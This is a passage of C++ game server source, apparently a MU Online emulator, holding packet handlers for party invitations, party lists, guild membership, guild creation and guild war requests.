			sMaxMinLevel[1] = gObj[number].Level;
		
		if ( gObj[aIndex].Level < gObj[number].Level )
			sMaxMinLevel[0] = gObj[aIndex].Level;
		else
			sMaxMinLevel[0] = gObj[number].Level;
		
		if ( (sMaxMinLevel[1]- sMaxMinLevel[0]) >ReadConfig.Max_Party_Level_Dif)
		{
			::GCResultSend(aIndex, 0x41, 0x05);
			// Restricted level for the party is %d
			// DEATHWAY FIX HERE
			LogAdd(lMsg.Get(MSGGET(2, 189)), gObj[aIndex].Name, gObj[aIndex].Level, gObj[number].Name, gObj[number].Level);
			return;
		}
	}

	gObj[aIndex].m_IfState.use = TRUE;
	gObj[aIndex].m_IfState.type = 2;
	gObj[aIndex].m_IfState.state = 0;
	gObj[number].m_IfState.use = TRUE;
	gObj[number].m_IfState.type = 2;
	gObj[number].m_IfState.state = 0;
	gObj[aIndex].TargetNumber = number;
	gObj[number].TargetNumber = aIndex;
	gObj[aIndex].m_InterfaceTime = GetTickCount();
	gObj[number].m_InterfaceTime = GetTickCount();
	gObj[aIndex].PartyTargetUser = number;
	
	PHeadSetB((LPBYTE)&pMsg, 0x40, sizeof(pMsg));
	pMsg.NumberH = SET_NUMBERH(aIndex);
	pMsg.NumberL = SET_NUMBERL(aIndex);

	DataSend(number, (LPBYTE)&pMsg, pMsg.h.size);
}





void CGPartyRequestResultRecv(PMSG_PARTYREQUESTRESULT * lpMsg, int aIndex)
{
	int number;
	BYTE result = true;
	char szTemp[256];
	int pnumber = -1;

	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if ( !PacketCheckTime(&gObj[aIndex]))
		return;

	number = MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL);

	if ( number < 0 || number > OBJMAX-1)
		return;

	if ( !gObjIsConnected(&gObj[aIndex]))
		return;

	if ( !gObjIsConnected(&gObj[number]))
	{
		result = false;
		GCResultSend(aIndex, 0x41, 0x04);
	}

	if ( gObj[number].MapNumber != gObj[aIndex].MapNumber )
	{
		result = false;
		GCResultSend(number, 0x41, 0x00);
	}

	if ( CC_MAP_RANGE(gObj[aIndex].MapNumber) )
	{
		result = false;
		GCServerMsgStringSend(lMsg.Get(MSGGET(4, 198)), aIndex, 1);
		::GCResultSend(number, 0x41, 0x00);
	}

	if ( IT_MAP_RANGE(gObj[aIndex].MapNumber) ) //ILLUSION DONT ALLOW PARTY WARP ROOM OR WRONG TEAM
	{
		BYTE Level = gObj[aIndex].MapNumber - 45;

		if (IllusionTemple.Room[Level].Start == 1)
		{
			BYTE pPos1 = IllusionTemple.Player_GetIndex(Level,number);
			BYTE pPos2 = IllusionTemple.Player_GetIndex(Level,aIndex);

			if (pPos1 == -1)
			{
				result = false;
				GCServerMsgStringSend(lMsg.Get(MSGGET(4, 198)), aIndex, 1);
				::GCResultSend(number, 0x41, 0x00);
			}

			if (pPos2 == -1)
			{
				result = false;
				GCServerMsgStringSend(lMsg.Get(MSGGET(4, 198)), aIndex, 1);
				::GCResultSend(number, 0x41, 0x00);
			}

			if (IllusionTemple.Room[Level].Player[pPos1].Team != IllusionTemple.Room[Level].Player[pPos2].Team )
			{
				result = false;
				GCServerMsgStringSend(lMsg.Get(MSGGET(4, 198)), aIndex, 1);
				::GCResultSend(number, 0x41, 0x00);
			}
		} else {
			result = false;
			GCServerMsgStringSend(lMsg.Get(MSGGET(4, 198)), aIndex, 1);
			::GCResultSend(number, 0x41, 0x00);
		}
	}

	if ( lpMsg->Result == 0 )
	{
		result = false;
		::GCResultSend(number, 0x41, 0x01);
	}

	if ( gObj[number].m_IfState.use == 0 || gObj[number].m_IfState.type != 2)
	{
		result = false;
		::GCResultSend(number, 0x41, 0x00);
	}	
	
	if ( gObj[aIndex].m_IfState.use == 0 || gObj[aIndex].m_IfState.type != 2)
	{
		result = false;
		::GCResultSend(number, 0x41, 0x00);
	}

	if ( result == 1 )
	{
		if ( gObj[number].PartyNumber < 0 )
		{
			gObj[number].PartyNumber = gParty.Create(number, gObj[number].DBNumber, gObj[number].Level);
		}

		if ( gObj[number].PartyNumber >= 0  )
		{
			pnumber = gObj[number].PartyNumber;
			int iPartyPos = gParty.Add(gObj[number].PartyNumber, aIndex, gObj[aIndex].DBNumber, gObj[aIndex].Level);

			if ( iPartyPos > 0 )
			{
				gObj[aIndex].PartyNumber = gObj[number].PartyNumber ;
				result = true;
				wsprintf(szTemp, lMsg.Get(MSGGET(4, 83)), gObj[aIndex].Name);
				::GCServerMsgStringSend(szTemp, number, 1);
				wsprintf(szTemp, lMsg.Get(MSGGET(4, 83)), gObj[number].Name);
				::GCServerMsgStringSend(szTemp, aIndex, 1);

				gParty.Paint(pnumber);
			}
			else if ( iPartyPos == -1 )
			{
				GCResultSend(number, 0x41, 2);
				GCResultSend(aIndex, 0x41, 2);
			}
			else if ( iPartyPos == -2 )
			{
				result = 2;
				wsprintf(szTemp, lMsg.Get(MSGGET(4, 84)), gObj[aIndex].Name);
				GCServerMsgStringSend(szTemp, aIndex, 1);
			}
		}
	}

	if ( gObj[aIndex].m_IfState.use !=  0 && gObj[aIndex].m_IfState.type == 2)
	{
		gObj[aIndex].m_IfState.use = 0;
		gObj[aIndex].PartyTargetUser = -1;
	}

	if ( gObj[number].m_IfState.use !=  0 && gObj[number].m_IfState.type == 2)
	{
		gObj[number].m_IfState.use = 0;
		gObj[number].PartyTargetUser = -1;
	}

	if ( pnumber >= 0 )
	{
		CGPartyListAll(pnumber);
	}
}


struct PMSG_PARTYLIST
{
	char szId[10];	// 0
	BYTE Number;	// A
	BYTE MapNumber;	// B
	BYTE X;	// C
	BYTE Y;	// D
	int Life;	// 10
	int MaxLife;	// 14
};


struct PMSG_PARTYLISTCOUNT
{
	PBMSG_HEAD h;	// C1:42
	BYTE Result;	// 3
	BYTE Count;	// 4
};



void CGPartyList(int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	PMSG_PARTYLISTCOUNT pCount;
	PMSG_PARTYLIST pList;
	BYTE sendbuf[512];
	int lOfs = 0;

	if ( !PacketCheckTime(&gObj[aIndex]))
		return;

	PHeadSetB((LPBYTE)&pCount, 0x42, sizeof(pCount));
	pCount.Count = 0;
	pCount.Result = false;

	int number;
	int pnumber = gObj[aIndex].PartyNumber ;

	if ( pnumber >= 0 )
		pCount.Count = gParty.GetCount(pnumber);

	lOfs += sizeof(pCount);

	if ( pCount.Count != 0 )
	{
		for ( int n=0;n<MAX_USER_IN_PARTY;n++)
		{
			number = gParty.m_PartyS[pnumber].Number[n];

			if ( number >= 0 )
			{
				if ( gObjIsConnected(&gObj[number], gParty.m_PartyS[pnumber].DbNumber[n]) == TRUE )
				{
					memset(&pList, 0, sizeof(pList));
					memcpy(pList.szId, gObj[number].Name, MAX_ACCOUNT_LEN);
					pList.Number = n;
					pList.MapNumber = gObj[number].MapNumber;
					pList.X = gObj[number].X;
					pList.Y = gObj[number].Y;
					pList.Life = gObj[number].Life;
					pList.MaxLife = gObj[number].MaxLife + gObj[number].AddLife;

					memcpy(&sendbuf[lOfs], &pList, sizeof(pList));
					lOfs += sizeof(pList);
				}
			}
		}

		pCount.Result = true;
	}

	pCount.h.size = lOfs;
	memcpy(sendbuf, &pCount, sizeof(pCount));
	
	DataSend(aIndex, (LPBYTE)&sendbuf, lOfs);
}




void CGPartyListAll(int pnumber)
{
	PMSG_PARTYLISTCOUNT pCount;
	PMSG_PARTYLIST pList;
	BYTE sendbuf[512];
	int lOfs = 0;
	int number;

	if ( pnumber < 0 )
		return;

	if ( gParty.IsParty(pnumber) == FALSE )
		return;

	PHeadSetB((LPBYTE)&pCount, 0x42, sizeof(pCount));
	pCount.Result = false;
	pCount.Count = gParty.GetCount(pnumber);

	if ( pCount.Count == 0 )
		return;

	pCount.Result = true;
	lOfs += sizeof(pCount);

	for ( int n=0;n<MAX_USER_IN_PARTY;n++)
	{
		number = gParty.m_PartyS[pnumber].Number[n];

		if ( number >= 0 )
		{
			if ( gObjIsConnected(&gObj[number], gParty.m_PartyS[pnumber].DbNumber[n]) == TRUE )
			{
				memset(&pList, 0, sizeof(pList));
				memcpy(pList.szId, gObj[number].Name, MAX_ACCOUNT_LEN);
				pList.Number = n;
				pList.MapNumber = gObj[number].MapNumber;
				pList.X = gObj[number].X;
				pList.Y = gObj[number].Y;
				pList.Life = gObj[number].Life;
				pList.MaxLife =  gObj[number].MaxLife;

				memcpy(&sendbuf[lOfs], &pList, sizeof(pList));
				lOfs += sizeof(pList);
			}
		}
	}

	pCount.h.size = lOfs;
	memcpy(sendbuf, &pCount, sizeof(pCount));

	for ( int n=0;n<MAX_USER_IN_PARTY;n++)
	{
		number = gParty.m_PartyS[pnumber].Number[n];

		if ( number >= 0 )
		{
			DataSend(number, sendbuf, lOfs);
		}
	}
}





void CGPartyDelUser(PMSG_PARTYDELUSER * lpMsg, int aIndex)
{
	int usernumber = -1;
	int dbnumber = -1;

	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if ( gObj[aIndex].PartyNumber < 0 )
	{
		LogAdd("No Party %s %s", gObj[aIndex].AccountID, gObj[aIndex].Name);
		return;
	}

	if ( !gParty.GetIndexUser(gObj[aIndex].PartyNumber, lpMsg->Number, usernumber, dbnumber))
	{
		LogAdd("User Not found");
		return;
	}

	if ( usernumber < 0 )
	{
		LogAdd("User Not found");
		return;
	}

	int count;
	int number;
	int pnumber = gObj[aIndex].PartyNumber;

	if ( pnumber < 0 )
	{
		LogAdd("%s %d", __FILE__, __LINE__);
		return;
	}

	count = gParty.GetCount(pnumber);

	if ( count < 1 )
	{
		LogAdd("%s %d", __FILE__, __LINE__);
		return;
	}

	if ( lpMsg->Number == 0 || count <= 2 )
	{
		for ( int n=0;n<MAX_USER_IN_PARTY;n++)
		{
			number = gParty.m_PartyS[pnumber].Number[n];

			if ( number >= 0 )
			{
				gParty.Delete(pnumber, n);
				gObj[number].PartyNumber = -1;
				gObj[number].PartyTargetUser = -1;
				GCPartyDelUserSend(number);
			}
		}

		gParty.Destroy(pnumber);
	}
	else
	{
		gParty.Delete(pnumber, lpMsg->Number);
		count = gParty.GetCount(gObj[aIndex].PartyNumber);
		gObj[usernumber].PartyNumber = -1;
		gObj[usernumber].PartyTargetUser = -1;
		GCPartyDelUserSend(usernumber);
		CGPartyListAll(pnumber);
	}		
}



struct PMSG_PARTYDELUSERSEND
{
	PBMSG_HEAD h;	// C1:43
};



void GCPartyDelUserSend(int aIndex)
{
	PMSG_PARTYDELUSERSEND pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x43, sizeof(pMsg));

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}


struct PMSG_GUILDQUESTSEND
{
	PBMSG_HEAD h;	// C1:50
	BYTE NumberH;	// 3
	BYTE NumberL;	// 4
};


void CGGuildRequestRecv(PMSG_GUILDJOINQ * lpMsg, int aIndex)
{
	PMSG_GUILDQUESTSEND pMsg;
	int number = MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL);

	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}
	if ( number < 0 || number > OBJMAX-1 )
		return;

	if ( !PacketCheckTime(&gObj[aIndex]))
		return;

	if ( !gObjIsConnected(&gObj[number]))
	{
		GCResultSend(aIndex, 0x51, 0x03);
		return;
	}

	if ( gObj[aIndex].m_IfState.use > 0 )
	{
		GCResultSend(aIndex, 0x51, 0x06);
		return;
	}
	
	if ( gObj[number].m_IfState.use > 0 )
	{
		GCResultSend(aIndex, 0x51, 0x06);
		return;
	}

	if ( gObj[aIndex].Level < 6 )
	{
		GCResultSend(aIndex, 0x51, 0x07);
		return;
	}

	if ( gObj[aIndex].GuildNumber > 0 )
	{
		GCResultSend(aIndex, 0x51, 0x05);
		return;
	}

	if ( (gObj[number].m_Option&1 ) != 1 )
	{
		GCResultSend(aIndex, 0x51, 0x00);
		return;
	}

	if ( gObj[number].GuildNumber > 0 )
	{
		if ( strcmp(gObj[number].lpGuild->Names[0], gObj[number].Name))
		{
			GCResultSend(aIndex, 0x51, 0x04);
			return;
		}

		if ( gObj[number].lpGuild->WarState )
		{
			GCResultSend(aIndex, 0x51, 0x06);
			return;
		}

		if(Gens.AllowJoinIfGuildMemberIsInOtherGens == 0)
		{
			if(gObj[aIndex].GensFam != 0 && gObj[aIndex].GensFam != gObj[number].GensFam)
			{
				GCServerMsgStringSend("You can not join into guild with diferent Gens Family", aIndex, 1);
				return;
			}
		}

		int MaxGuildMember;

		if ( gObj[number].Class == CLASS_DARKLORD )
			MaxGuildMember = gObj[number].Level / 10 + gObj[number].Leadership / 10;
		else
			MaxGuildMember = gObj[number].Level / 10;

		if ( MaxGuildMember > MAX_USER_GUILD )
			MaxGuildMember = MAX_USER_GUILD;

		if ( gObj[number].lpGuild->TotalCount >= MaxGuildMember )
		{
			GCResultSend(aIndex, 0x51, 0x02);
			return;
		}
	}
	else
	{
		GCResultSend(aIndex, 0x51, 0x04);
		return;
	}

	gObj[aIndex].m_IfState.use = 1;
	gObj[aIndex].m_IfState.type = 4;
	gObj[aIndex].m_IfState.state = 0;

	gObj[number].m_IfState.use = 1;
	gObj[number].m_IfState.type = 4;
	gObj[number].m_IfState.state = 0;

	gObj[aIndex].TargetNumber = number;
	gObj[number].TargetNumber = aIndex;
	gObj[aIndex].m_InterfaceTime = GetTickCount();
	gObj[number].m_InterfaceTime = GetTickCount();

	PHeadSetB((LPBYTE)&pMsg, 0x50, sizeof(pMsg));
	pMsg.NumberH = SET_NUMBERH(aIndex);
	pMsg.NumberL = SET_NUMBERL(aIndex);

	DataSend(number, (LPBYTE)&pMsg, pMsg.h.size);

	LogAddTD("[%s][%s] Guild Request - Join : %s",
		gObj[aIndex].AccountID, gObj[aIndex].Name,
		gObj[number].lpGuild->Name);
}




void CGGuildRequestResultRecv(PMSG_GUILDQRESULT * lpMsg, int aIndex)
{
	int number;
	BYTE result=0;

	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if ( !PacketCheckTime(&gObj[aIndex]))
		return;

	#if (GS_CASTLE==1)
	if(g_CastleSiegeSync.GetCastleState() == 7) //Good
	{
		MsgOutput(aIndex,(lMsg.Get(MSGGET(6, 194))));
		return;
	}
	#endif

	number = MAKE_NUMBERW(lpMsg->NumberH, lpMsg->NumberL);

	if ( number < 0 || number > OBJMAX-1)
		return;

	if ( !gObjIsConnected(&gObj[number]))
	{
		GCResultSend(aIndex, 0x51, 0x02);
	}
	else
	{
		result = 1;
	}

	if ( lpMsg->Result == 0 )
	{
		result = 0;
		GCResultSend(number, 0x51, 0x00);
	}

	if ( result == 1 )
	{
		if ( gObj[aIndex].GuildNumber > 0 )
		{
			GDGuildMemberAdd(number, gObj[aIndex].lpGuild->Name, gObj[number].Name);
		}
	}

	if ( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type == 4)
		gObj[aIndex].m_IfState.use = 0;
		
	if ( gObj[number].m_IfState.use && gObj[number].m_IfState.type == 4)
		gObj[number].m_IfState.use = 0;
}







struct PMSG_GUILDLIST
{
	char Name[10];	// 0
	BYTE Number;	// A
	BYTE ConnectAServer;	// B
	BYTE btGuildStatus;	// C
};


struct PMSG_GUILDLISTCOUNT
{
	PWMSG_HEAD h;	// C2:52
	BYTE Result;	// 4
	BYTE Count;	// 5
	int TotalScore;	// 8
	BYTE Score;	// C
	char szRivalGuild[9];	// D
};



void CGGuildListAll(int pnumber)
{
	if(OBJMAX_RANGE(pnumber) == 0)
	{
		return;
	}

	if ( gObj[pnumber].lpGuild == NULL )
		return;

	PMSG_GUILDLISTCOUNT pCount;
	PMSG_GUILDLIST pList;
	char sendbuf[1500];
	int lOfs = 0;
	int number;
	int n;
	int guildmaster = 0;
	
	PHeadSetW((LPBYTE)&pCount, 0x52, 0);
	pCount.Result = 0;
	pCount.Count = 0;
	lOfs += sizeof(pCount);
	pCount.h.sizeH = SET_NUMBERH(lOfs);
	pCount.h.sizeL = SET_NUMBERL(lOfs);

	if ( gObj[pnumber].GuildNumber < 1 )
	{
		DataSend(pnumber, (LPBYTE)&pCount, lOfs);
		return;
	}

	pCount.Count = gObj[pnumber].lpGuild->Count;
	pCount.TotalScore = gObj[pnumber].lpGuild->TotalScore;
	pCount.Score = gObj[pnumber].lpGuild->PlayScore;
	memset(pCount.szRivalGuild, 0, sizeof(pCount.szRivalGuild));

	if ( gObj[pnumber].lpGuild->iGuildRival )
		memcpy(pCount.szRivalGuild, gObj[pnumber].lpGuild->szGuildRivalName, MAX_GUILD_LEN);

	pCount.Result = 1;
	guildmaster = 1;

	if ( pCount.Count == 0 )
		return;

	pCount.Count = 0;

	for ( n=0;n<MAX_USER_GUILD;n++)
	{
		number = gObj[pnumber].lpGuild->Use[n];

		if ( number > 0 )
		{
			memset(&pList, 0, sizeof(pList));
			memcpy(pList.Name, gObj[pnumber].lpGuild->Names[n], sizeof(pList.Name));
			pList.Number = gObj[pnumber].lpGuild->pServer[n];
			pList.ConnectAServer = (short)gObj[pnumber].lpGuild->pServer[n] & 0x7F;

			if ( gObj[pnumber].lpGuild->pServer[n] >= 0 )
				pList.ConnectAServer |= 0x80;

			pList.btGuildStatus = gObj[pnumber].lpGuild->GuildStatus[n];
			memcpy(&sendbuf[lOfs], &pList, sizeof(pList));
			lOfs+= sizeof(pList);
			pCount.Count++;
		}
	}

	pCount.h.sizeH = SET_NUMBERH(lOfs);
	pCount.h.sizeL = SET_NUMBERL(lOfs);
	memcpy(sendbuf, (LPBYTE)&pCount, sizeof(pCount));

	DataSend(pnumber, (LPBYTE)sendbuf, lOfs);
}


struct PMSG_GUILDDELUSER_RESULT
{
	PBMSG_HEAD h;	// C1:53
	BYTE Result;	// 3
};


void CGGuildDelUser(PMSG_GUILDDELUSER * lpMsg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if ( !PacketCheckTime(&gObj[aIndex]))
		return;

	if ( gObj[aIndex].GuildNumber < 1 )
		return;

	char joomin[11];
	char memberid[11];
	char guildname[11];
	PMSG_GUILDDELUSER_RESULT pMsg;
	
	PHeadSetB((LPBYTE)&pMsg, 0x53, sizeof(pMsg));
	pMsg.Result = 3;

	if ( !gGuildDestroy )
	{
		DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
		return;
	}

	memset(memberid, 0, sizeof(memberid));
	memset(guildname, 0, sizeof(guildname));
	memcpy(memberid, lpMsg->Name, MAX_ACCOUNT_LEN);
	strcpy(guildname, gObj[aIndex].lpGuild->Name);

	if ( !strcmp(gObj[aIndex].lpGuild->Names[0], gObj[aIndex].Name ))
	{
		memset(joomin, 0, sizeof(joomin));
		memcpy(joomin, lpMsg->JoominNumber, 10);

		if ( gObjJoominCheck(aIndex, joomin) == TRUE )
		{
			if ( !strcmp(memberid, gObj[aIndex].Name ))
			{
				gObjGuildWarMasterClose(&gObj[aIndex]);
				GDGuildDestroySend(aIndex, gObj[aIndex].lpGuild->Name, gObj[aIndex].Name);
			}
			else
			{
				GDGuildMemberDel(aIndex, guildname, memberid);
			}

			LogAddTD("[%s][%s] Guild Request - Dismiss All : %s",
				gObj[aIndex].AccountID,gObj[aIndex].Name, guildname);
		}
		else
		{
			pMsg.Result = 0;
			DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
			return;
		}
	}
	else
	{
		if ( strcmp(memberid, gObj[aIndex].Name) )
		{
			pMsg.Result = 0;
			DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
			return;
		}

		memset(joomin, 0, sizeof(joomin));
		memcpy(joomin, lpMsg->JoominNumber, 10);

		if ( gObjJoominCheck(aIndex, joomin) == TRUE )
		{
			GDGuildMemberDel(aIndex, guildname, memberid);
		}
		else
		{
			GCServerMsgStringSend(lMsg.Get(MSGGET(4, 108)), aIndex, 1);
		}

		LogAddTD("[%s][%s] Guild Request - Leave : %s",
			gObj[aIndex].AccountID, gObj[aIndex].Name, guildname);
	}
}




void GCGuildDelUserResult(int aIndex, BYTE Result)
{
	PMSG_GUILDDELUSER_RESULT pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x53, sizeof(pMsg));
	pMsg.Result = Result;

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}




struct PMSG_GUILDMASTERQUESTION
{
	PBMSG_HEAD h;	// C1:54
};


void GCGuildMasterQuestionSend(int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if ( gObj[aIndex].m_IfState.use > 0 )
	{
		return;
	}

	PMSG_GUILDMASTERQUESTION pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x54, sizeof(pMsg));
	gObj[aIndex].m_IfState.use = 1;
	gObj[aIndex].m_IfState.type = 5;
	gObj[aIndex].m_IfState.state = 0;

	DataSend(aIndex, (UCHAR*)&pMsg, pMsg.h.size);
}




void CGGuildMasterAnswerRecv(PMSG_GUILDMASTERANSWER * lpMsg, int aIndex)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if ( lpMsg->Result == 1 )
	{
		if ( !gObjGuildMasterCapacityTest(&gObj[aIndex]))
		{
			if ( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type == 5 )
			{
				gObj[aIndex].m_IfState.use = 0;
			}

			return;
		}

		GCGuildMasterManagerRun(aIndex);
		return;
	}

	if ( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type == 5 )
	{
		gObj[aIndex].m_IfState.use = 0;
	}
}



struct PMSG_GUILDMASTERMANAGER_RUN
{
	PBMSG_HEAD h;	// C1:55
};


void GCGuildMasterManagerRun(int aIndex)
{
	PMSG_GUILDMASTERMANAGER_RUN pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x55, sizeof(pMsg));

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}




void CGGuildMasterInfoSave(int aIndex, PMSG_GUILDINFOSAVE * lpMsg)
{
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	char GuildName[MAX_GUILD_LEN+1];
	GuildName[MAX_GUILD_LEN] ='\0';
	memcpy(GuildName, lpMsg->GuildName, MAX_GUILD_LEN);
	int len = strlen(GuildName);

	if ( len <= 2 || len > MAX_GUILD_LEN)
	{
		PMSG_GUILDCREATED_RESULT pMsg;

		PHeadSetB((LPBYTE)&pMsg, 0x56, sizeof(pMsg));
		pMsg.Result = 2;
		
		DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);

		if ( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type == 5 )
		{
			gObj[aIndex].m_IfState.use = 0;
		}

		return;
	}

	GDGuildCreateSend(aIndex, GuildName, gObj[aIndex].Name, lpMsg->Mark, lpMsg->btGuildType);

	if ( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type == 5 )
	{
		gObj[aIndex].m_IfState.use = 0;
	}
}




void CGGuildMasterCreateCancel(int aIndex)
{
	if ( gObj[aIndex].GuildNumber > 0 )
		return;

	if ( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type == 5 )
	{
		gObj[aIndex].m_IfState.use = 0;
	}
}



void GCGuildViewportNowPaint(int aIndex, char* guildname, BYTE* mark, BOOL isGuildMaster)
{
	_GUILD_INFO_STRUCT * lpGuild = Guild.SearchGuild(guildname);

	if ( lpGuild == NULL )
		return;

	LPOBJ lpObj = &gObj[aIndex];
	BYTE _GuildInfoBuf[256] = {0};
	int _GuildInfoOfs = 5;

	if ( lpObj->lpGuild == NULL )
		return;


	PMSG_SIMPLE_GUILDVIEWPORT pMsg;
	pMsg.GuildNumber = lpObj->lpGuild->Number;
	pMsg.NumberH = SET_NUMBERH(aIndex)&0x7F;
	pMsg.NumberL = SET_NUMBERL(aIndex);

	if ( isGuildMaster != FALSE )
		pMsg.NumberH |= 0x80;


	if ( isGuildMaster != FALSE )
		pMsg.btGuildStatus = 0x80;
	else
		pMsg.btGuildStatus = lpObj->GuildStatus;

	pMsg.btGuildType = lpObj->lpGuild->btGuildType;
	pMsg.btGuildRelationShip = 0;
	lpObj->iGuildUnionTimeStamp = 0;
	memcpy(&_GuildInfoBuf[_GuildInfoOfs], &pMsg, sizeof(pMsg));
	_GuildInfoOfs += sizeof(pMsg);

	PMSG_SIMPLE_GUILDVIEWPORT_COUNT pGVCount;

	pGVCount.h.c = 0xC2;
	pGVCount.h.headcode = 0x65;
	pGVCount.h.sizeH = SET_NUMBERH(_GuildInfoOfs);
	pGVCount.h.sizeL = SET_NUMBERL(_GuildInfoOfs);
	pGVCount.Count = 1;
	memcpy(_GuildInfoBuf, &pGVCount, sizeof(pGVCount));

	if ( !CC_MAP_RANGE(gObj[aIndex].MapNumber) )
		DataSend(aIndex, _GuildInfoBuf, _GuildInfoOfs);

	MsgSendV2(lpObj, _GuildInfoBuf, _GuildInfoOfs);
}




struct PMSG_GUILDDEL_VIEWPORT_NOW
{
	PBMSG_HEAD h;	// C1:5D
	BYTE NumberH;	// 3
	BYTE NumberL;	// 4
};




void GCGuildViewportDelNow(int aIndex, BOOL isGuildMaster)
{
	PMSG_GUILDDEL_VIEWPORT_NOW pMsg;

	LPOBJ lpObj = &gObj[aIndex];

	PHeadSetB((LPBYTE)&pMsg, 0x5D, sizeof(pMsg));
	pMsg.NumberH = SET_NUMBERH(aIndex) & 0x7F;
	pMsg.NumberL = SET_NUMBERL(aIndex);

	if ( isGuildMaster != FALSE )
	{
		pMsg.NumberH |= 0x80;
	}

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
	MsgSendV2(lpObj, (LPBYTE)&pMsg, pMsg.h.size);
}




void GCManagerGuildWarEnd(char * GuildName)
{
	_GUILD_INFO_STRUCT * lpNode = Guild.SearchGuild(GuildName);

	if ( lpNode == NULL )
	{
		return;
	}

	int n=0;
	int warmaster = -1;

	while ( true )
	{
		if ( gObj[n].Type == OBJ_USER )
		{
			if ( gObj[n].Connected > PLAYER_LOGGED )
			{
				if ( gObj[n].Name[0] == lpNode->Names[0][0] )
				{
					if ( strcmp(gObj[n].Name, lpNode->Names[0]) == 0 )
					{
						warmaster = n;
						break;
					}
				}
			}
		}

		if ( n < OBJMAX-1 )
		{
			n++;
		}
		else
		{
			break;
		}
	}

	if ( warmaster >= 1 )
	{
		BYTE Result1 = 0;
		BYTE Result2 = 0;

		if ( lpNode != NULL )
		{
			if ( lpNode->lpTargetGuildNode != NULL )
			{
				if ( lpNode->PlayScore == 0 && lpNode->lpTargetGuildNode->PlayScore == 0 )
				{
					Result1 = 6;
					Result2 = 6;
				}
				else
				{
					Result1 = 0;
					Result2 = 1;
				}
			}
		}

		if ( lpNode->WarType == 1 )
		{
			gBattleGroundEnable(lpNode->BattleGroundIndex, FALSE );
			gObjGuildWarEndSend(lpNode, lpNode->lpTargetGuildNode, Result1, Result2);
			gObjGuildWarEnd(lpNode, lpNode->lpTargetGuildNode);

			cManager.BattleInfoSend(::GetBattleTeamName(0, 0), -1, ::GetBattleTeamName(0, 1), -1);
		}
		else
		{
			gObjGuildWarEndSend(lpNode, lpNode->lpTargetGuildNode, Result1, Result2);
			gObjGuildWarEnd(lpNode, lpNode->lpTargetGuildNode);
		}
	}
}




void GCManagerGuildWarSet(LPSTR GuildName1, LPSTR GuildName2, int type)
{
	_GUILD_INFO_STRUCT * lpNode = Guild.SearchGuild(GuildName1);

	if ( lpNode == NULL )
	{
		return;
	}

	int n=0;
	int warmaster = -1;

	while ( true )
	{
		if ( gObj[n].Type == OBJ_USER )
		{
			if ( gObj[n].Connected > PLAYER_LOGGED )
			{
				if ( gObj[n].Name[0] == lpNode->Names[0][0] )
				{
					if ( strcmp(gObj[n].Name, lpNode->Names[0]) == 0 )
					{
						warmaster = n;
						break;
					}
				}
			}
		}

		if ( n < OBJMAX-1 )
		{
			n++;
		}
		else
		{
			break;
		}
	}

	if ( warmaster >= 1 )
	{
		::GCGuildWarRequestResult(GuildName2, warmaster, type);
	}
}



struct PMSG_GUILDWARREQUEST_RESULT
{
	PBMSG_HEAD h;	// C1:60
	BYTE Result;	// 3
};


void GCGuildWarRequestResult(LPSTR GuildName, int aIndex, int type)
{
#if (GS_CASTLE==0)
	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if ( gObj[aIndex].m_IfState.use > 0 && gObj[aIndex].m_IfState.type != 12)
	{
		if(ReadConfig.AHLog == TRUE)
		{
			ANTI_HACK_LOG.Output("[Anti-Hack][Trade & War] (%s)(%s)",
				gObj[aIndex].AccountID, gObj[aIndex].Name);
		}
		return;
	}

	PMSG_GUILDWARREQUEST_RESULT pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x60, sizeof(pMsg));
	pMsg.Result = 3;

	if ( gObj[aIndex].GuildNumber < 1)
	{
		DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
		return;
	}

	_GUILD_INFO_STRUCT * lpMyGuild = gObj[aIndex].lpGuild;

	if ( !lpMyGuild )
	{
		DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
		return;
	}

	if ( lpMyGuild->WarState == 1 || lpMyGuild->WarDeclareState == 1 )
	{
		pMsg.Result = 4;

		//Error on declaring war : %d %d %s
		LogAdd(lMsg.Get(MSGGET(1, 234)), lpMyGuild->WarState,
			lpMyGuild->WarDeclareState, lpMyGuild->Name);
		DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);

		return;
	}

	if ( PvP.gPkLimitFree == FALSE && gObj[aIndex].m_PK_Level >= 5)
	{
		pMsg.Result = 4;

		LogAdd("Error on declaring war : GuildMaster Is Murderer 0x04 %s %s",
			lpMyGuild->Names[0], gObj[aIndex].Name);

		DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);

		return;
	}

